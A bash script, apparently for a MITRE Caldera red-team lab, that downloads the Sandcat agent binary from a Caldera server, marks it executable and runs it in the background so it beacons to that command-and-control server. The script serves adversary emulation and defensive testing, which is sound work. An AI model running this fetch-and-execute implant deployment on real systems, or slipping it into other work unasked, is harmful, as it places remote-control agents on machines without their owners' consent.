#!/bin/bash
# Sandcat Agent Deployment Script
# Downloads and runs Sandcat agent connecting to specified Caldera server
#
# Usage: ./deploy-sandcat.sh <caldera-server-ip> [port] [group]
# Example: ./deploy-sandcat.sh 10.0.1.2 8888 red

CALDERA_IP="${1:-10.0.1.2}"
CALDERA_PORT="${2:-8888}"
GROUP="${3:-red}"

SERVER="http://${CALDERA_IP}:${CALDERA_PORT}"

echo "=========================================="
echo "Sandcat Agent Deployment"
echo "=========================================="
echo "  Caldera Server: ${SERVER}"
echo "  Group: ${GROUP}"
echo ""

# Download sandcat agent
echo "Downloading Sandcat agent..."
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "${SERVER}/file/download" -o /tmp/sandcat

if [ -f /tmp/sandcat ] && [ -s /tmp/sandcat ]; then
    chmod +x /tmp/sandcat
    echo "Starting Sandcat agent in background..."
    nohup /tmp/sandcat -server "${SERVER}" -group "${GROUP}" -v > /tmp/sandcat.log 2>&1 &
    SANDCAT_PID=$!
    echo ""
    echo "=========================================="
    echo "Agent deployed successfully!"
    echo "  PID: ${SANDCAT_PID}"
    echo "  Log: /tmp/sandcat.log"
    echo "=========================================="
else
    echo ""
    echo "=========================================="
    echo "ERROR: Failed to download Sandcat agent"
    echo "  - Is Caldera running at ${SERVER}?"
    echo "  - Try: curl -s ${SERVER}/api/v2/health"
    echo "=========================================="
    exit 1
fi
